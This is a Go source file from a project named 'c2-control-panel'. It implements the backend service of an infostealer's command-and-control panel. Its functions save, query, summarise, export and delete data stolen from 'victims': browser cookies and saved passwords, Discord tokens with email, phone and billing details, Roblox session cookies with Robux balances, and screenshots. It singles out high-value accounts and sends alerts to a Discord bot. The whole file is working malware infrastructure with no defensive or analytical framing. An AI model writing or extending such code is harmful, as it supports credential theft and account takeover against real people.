package services

import (
	"database/sql"
	"encoding/json"
	"fmt"
	"log"
	"time"

	"c2-control-panel/models"
)

// StolenDataService handles storage and retrieval of stolen data
type StolenDataService struct {
	DB          *sql.DB
	DiscordBot  *DiscordBot
}

// NewStolenDataService creates a new stolen data service
func NewStolenDataService(db *sql.DB, discordBot *DiscordBot) *StolenDataService {
	return &StolenDataService{
		DB:         db,
		DiscordBot: discordBot,
	}
}

// ==================== BROWSER COOKIES ====================

// SaveBrowserCookies saves multiple browser cookies
func (s *StolenDataService) SaveBrowserCookies(victimID string, cookies []models.BrowserCookie) (int, error) {
	if len(cookies) == 0 {
		return 0, nil
	}
	
	savedCount := 0
	
	query := `
		INSERT INTO browser_cookies (victim_id, browser, host, name, value, path, expires_at, is_secure, is_http_only, same_site)
		VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10)
		ON CONFLICT DO NOTHING
	`
	
	for _, cookie := range cookies {
		_, err := s.DB.Exec(query,
			victimID,
			cookie.Browser,
			cookie.Host,
			cookie.Name,
			cookie.Value,
			cookie.Path,
			cookie.ExpiresAt,
			cookie.IsSecure,
			cookie.IsHttpOnly,
			cookie.SameSite,
		)
		
		if err != nil {
			log.Printf("[StolenData] Failed to save cookie: %v", err)
			continue
		}
		savedCount++
	}
	
	if savedCount > 0 {
		log.Printf("[StolenData] Saved %d cookies from victim %s", savedCount, victimID)
		s.DiscordBot.NotifyDataStolen(victimID, "cookies", savedCount)
	}
	
	return savedCount, nil
}

// GetBrowserCookies retrieves cookies for a victim
func (s *StolenDataService) GetBrowserCookies(victimID string, browser string, host string) ([]models.BrowserCookie, error) {
	query := `
		SELECT id, victim_id, browser, host, name, value, path, expires_at, is_secure, is_http_only, same_site, created_at
		FROM browser_cookies
		WHERE victim_id = $1
	`
	
	args := []interface{}{victimID}
	
	if browser != "" {
		query += " AND browser = $2"
		args = append(args, browser)
	}
	
	if host != "" {
		if browser != "" {
			query += " AND host LIKE $3"
		} else {
			query += " AND host LIKE $2"
		}
		args = append(args, "%"+host+"%")
	}
	
	query += " ORDER BY created_at DESC"
	
	rows, err := s.DB.Query(query, args...)
	if err != nil {
		return nil, err
	}
	defer rows.Close()
	
	var cookies []models.BrowserCookie
	for rows.Next() {
		var cookie models.BrowserCookie
		err := rows.Scan(
			&cookie.ID,
			&cookie.VictimID,
			&cookie.Browser,
			&cookie.Host,
			&cookie.Name,
			&cookie.Value,
			&cookie.Path,
			&cookie.ExpiresAt,
			&cookie.IsSecure,
			&cookie.IsHttpOnly,
			&cookie.SameSite,
			&cookie.CreatedAt,
		)
		if err != nil {
			log.Printf("[StolenData] Error scanning cookie: %v", err)
			continue
		}
		cookies = append(cookies, cookie)
	}
	
	return cookies, nil
}

// ==================== BROWSER PASSWORDS ====================

// SaveBrowserPasswords saves multiple browser passwords
func (s *StolenDataService) SaveBrowserPasswords(victimID string, passwords []models.BrowserPassword) (int, error) {
	if len(passwords) == 0 {
		return 0, nil
	}
	
	savedCount := 0
	
	query := `
		INSERT INTO browser_passwords (victim_id, browser, url, username, password)
		VALUES ($1, $2, $3, $4, $5)
		ON CONFLICT DO NOTHING
	`
	
	for _, pwd := range passwords {
		_, err := s.DB.Exec(query,
			victimID,
			pwd.Browser,
			pwd.URL,
			pwd.Username,
			pwd.Password,
		)
		
		if err != nil {
			log.Printf("[StolenData] Failed to save password: %v", err)
			continue
		}
		savedCount++
	}
	
	if savedCount > 0 {
		log.Printf("[StolenData] Saved %d passwords from victim %s", savedCount, victimID)
		s.DiscordBot.NotifyDataStolen(victimID, "passwords", savedCount)
	}
	
	return savedCount, nil
}

// GetBrowserPasswords retrieves passwords for a victim
func (s *StolenDataService) GetBrowserPasswords(victimID string, browser string) ([]models.BrowserPassword, error) {
	query := `
		SELECT id, victim_id, browser, url, username, password, created_at
		FROM browser_passwords
		WHERE victim_id = $1
	`
	
	args := []interface{}{victimID}
	
	if browser != "" {
		query += " AND browser = $2"
		args = append(args, browser)
	}
	
	query += " ORDER BY created_at DESC"
	
	rows, err := s.DB.Query(query, args...)
	if err != nil {
		return nil, err
	}
	defer rows.Close()
	
	var passwords []models.BrowserPassword
	for rows.Next() {
		var pwd models.BrowserPassword
		err := rows.Scan(
			&pwd.ID,
			&pwd.VictimID,
			&pwd.Browser,
			&pwd.URL,
			&pwd.Username,
			&pwd.Password,
			&pwd.CreatedAt,
		)
		if err != nil {
			log.Printf("[StolenData] Error scanning password: %v", err)
			continue
		}
		passwords = append(passwords, pwd)
	}
	
	return passwords, nil
}

// ==================== DISCORD TOKENS ====================

// SaveDiscordTokens saves multiple Discord tokens
func (s *StolenDataService) SaveDiscordTokens(victimID string, tokens []models.DiscordToken) (int, error) {
	if len(tokens) == 0 {
		return 0, nil
	}
	
	savedCount := 0
	highValueCount := 0
	
	query := `
		INSERT INTO discord_tokens (victim_id, token, email, username, phone, mfa, verified, nitro, billing, source)
		VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10)
		ON CONFLICT (token) DO UPDATE SET
			email = EXCLUDED.email,
			username = EXCLUDED.username,
			phone = EXCLUDED.phone,
			mfa = EXCLUDED.mfa,
			verified = EXCLUDED.verified,
			nitro = EXCLUDED.nitro,
			billing = EXCLUDED.billing
	`
	
	for _, token := range tokens {
		_, err := s.DB.Exec(query,
			victimID,
			token.Token,
			token.Email,
			token.Username,
			token.Phone,
			token.MFA,
			token.Verified,
			token.Nitro,
			token.Billing,
			token.Source,
		)
		
		if err != nil {
			log.Printf("[StolenData] Failed to save Discord token: %v", err)
			continue
		}
		savedCount++
		
		// Check for high-value accounts
		if token.Nitro != "None" || token.Billing {
			highValueCount++
			details := fmt.Sprintf("**Email**: %s\n**Username**: %s\n**Nitro**: %s\n**Billing**: %v\n**MFA**: %v",
				token.Email, token.Username, token.Nitro, token.Billing, token.MFA)
			s.DiscordBot.NotifyHighValueData(victimID, "Discord Account with Nitro/Billing", details)
		}
	}
	
	if savedCount > 0 {
		log.Printf("[StolenData] Saved %d Discord tokens from victim %s (%d high-value)", savedCount, victimID, highValueCount)
		s.DiscordBot.NotifyDataStolen(victimID, "discord", savedCount)
	}
	
	return savedCount, nil
}

// GetDiscordTokens retrieves Discord tokens for a victim
func (s *StolenDataService) GetDiscordTokens(victimID string) ([]models.DiscordToken, error) {
	query := `
		SELECT id, victim_id, token, email, username, phone, mfa, verified, nitro, billing, source, created_at
		FROM discord_tokens
		WHERE victim_id = $1
		ORDER BY created_at DESC
	`
	
	rows, err := s.DB.Query(query, victimID)
	if err != nil {
		return nil, err
	}
	defer rows.Close()
	
	var tokens []models.DiscordToken
	for rows.Next() {
		var token models.DiscordToken
		err := rows.Scan(
			&token.ID,
			&token.VictimID,
			&token.Token,
			&token.Email,
			&token.Username,
			&token.Phone,
			&token.MFA,
			&token.Verified,
			&token.Nitro,
			&token.Billing,
			&token.Source,
			&token.CreatedAt,
		)
		if err != nil {
			log.Printf("[StolenData] Error scanning Discord token: %v", err)
			continue
		}
		tokens = append(tokens, token)
	}
	
	return tokens, nil
}

// ==================== ROBLOX COOKIES ====================

// SaveRobloxCookies saves multiple Roblox cookies
func (s *StolenDataService) SaveRobloxCookies(victimID string, cookies []models.RobloxCookie) (int, error) {
	if len(cookies) == 0 {
		return 0, nil
	}
	
	savedCount := 0
	highValueCount := 0
	
	query := `
		INSERT INTO roblox_cookies (victim_id, cookie, username, user_id, robux, premium)
		VALUES ($1, $2, $3, $4, $5, $6)
		ON CONFLICT (cookie) DO UPDATE SET
			username = EXCLUDED.username,
			user_id = EXCLUDED.user_id,
			robux = EXCLUDED.robux,
			premium = EXCLUDED.premium
	`
	
	for _, cookie := range cookies {
		_, err := s.DB.Exec(query,
			victimID,
			cookie.Cookie,
			cookie.Username,
			cookie.UserID,
			cookie.Robux,
			cookie.Premium,
		)
		
		if err != nil {
			log.Printf("[StolenData] Failed to save Roblox cookie: %v", err)
			continue
		}
		savedCount++
		
		// Check for high-value accounts (>1000 robux or premium)
		if cookie.Robux > 1000 || cookie.Premium {
			highValueCount++
			details := fmt.Sprintf("**Username**: %s\n**Robux**: %d\n**Premium**: %v\n**User ID**: %s",
				cookie.Username, cookie.Robux, cookie.Premium, cookie.UserID)
			s.DiscordBot.NotifyHighValueData(victimID, "Roblox Account with Robux", details)
		}
	}
	
	if savedCount > 0 {
		log.Printf("[StolenData] Saved %d Roblox cookies from victim %s (%d high-value)", savedCount, victimID, highValueCount)
		s.DiscordBot.NotifyDataStolen(victimID, "roblox", savedCount)
	}
	
	return savedCount, nil
}

// GetRobloxCookies retrieves Roblox cookies for a victim
func (s *StolenDataService) GetRobloxCookies(victimID string) ([]models.RobloxCookie, error) {
	query := `
		SELECT id, victim_id, cookie, username, user_id, robux, premium, created_at
		FROM roblox_cookies
		WHERE victim_id = $1
		ORDER BY robux DESC, created_at DESC
	`
	
	rows, err := s.DB.Query(query, victimID)
	if err != nil {
		return nil, err
	}
	defer rows.Close()
	
	var cookies []models.RobloxCookie
	for rows.Next() {
		var cookie models.RobloxCookie
		err := rows.Scan(
			&cookie.ID,
			&cookie.VictimID,
			&cookie.Cookie,
			&cookie.Username,
			&cookie.UserID,
			&cookie.Robux,
			&cookie.Premium,
			&cookie.CreatedAt,
		)
		if err != nil {
			log.Printf("[StolenData] Error scanning Roblox cookie: %v", err)
			continue
		}
		cookies = append(cookies, cookie)
	}
	
	return cookies, nil
}

// ==================== SUMMARY & EXPORT ====================

// GetStolenDataSummary returns a summary of all stolen data for a victim
func (s *StolenDataService) GetStolenDataSummary(victimID string) (*models.StolenDataSummary, error) {
	summary := &models.StolenDataSummary{
		VictimID: victimID,
	}
	
	// Count cookies
	s.DB.QueryRow("SELECT COUNT(*) FROM browser_cookies WHERE victim_id = $1", victimID).Scan(&summary.CookiesCount)
	
	// Count passwords
	s.DB.QueryRow("SELECT COUNT(*) FROM browser_passwords WHERE victim_id = $1", victimID).Scan(&summary.PasswordsCount)
	
	// Count Discord tokens
	s.DB.QueryRow("SELECT COUNT(*) FROM discord_tokens WHERE victim_id = $1", victimID).Scan(&summary.DiscordTokens)
	
	// Count Roblox cookies
	s.DB.QueryRow("SELECT COUNT(*) FROM roblox_cookies WHERE victim_id = $1", victimID).Scan(&summary.RobloxCookies)
	
	// Count screenshots
	s.DB.QueryRow("SELECT COUNT(*) FROM screenshots WHERE victim_id = $1", victimID).Scan(&summary.ScreenshotsCount)
	
	return summary, nil
}

// ExportVictimData exports all stolen data for a victim as JSON
func (s *StolenDataService) ExportVictimData(victimID string) ([]byte, error) {
	exportData := map[string]interface{}{
		"victim_id":   victimID,
		"exported_at": time.Now().Format(time.RFC3339),
	}
	
	// Get cookies
	cookies, _ := s.GetBrowserCookies(victimID, "", "")
	exportData["cookies"] = cookies
	
	// Get passwords
	passwords, _ := s.GetBrowserPasswords(victimID, "")
	exportData["passwords"] = passwords
	
	// Get Discord tokens
	discordTokens, _ := s.GetDiscordTokens(victimID)
	exportData["discord_tokens"] = discordTokens
	
	// Get Roblox cookies
	robloxCookies, _ := s.GetRobloxCookies(victimID)
	exportData["roblox_cookies"] = robloxCookies
	
	// Get summary
	summary, _ := s.GetStolenDataSummary(victimID)
	exportData["summary"] = summary
	
	return json.MarshalIndent(exportData, "", "  ")
}

// DeleteVictimData deletes all stolen data for a victim
func (s *StolenDataService) DeleteVictimData(victimID string) error {
	queries := []string{
		"DELETE FROM browser_cookies WHERE victim_id = $1",
		"DELETE FROM browser_passwords WHERE victim_id = $1",
		"DELETE FROM discord_tokens WHERE victim_id = $1",
		"DELETE FROM roblox_cookies WHERE victim_id = $1",
		"DELETE FROM screenshots WHERE victim_id = $1",
	}
	
	for _, query := range queries {
		if _, err := s.DB.Exec(query, victimID); err != nil {
			log.Printf("[StolenData] Error deleting data: %v", err)
		}
	}
	
	log.Printf("[StolenData] Deleted all stolen data for victim %s", victimID)
	return nil
}
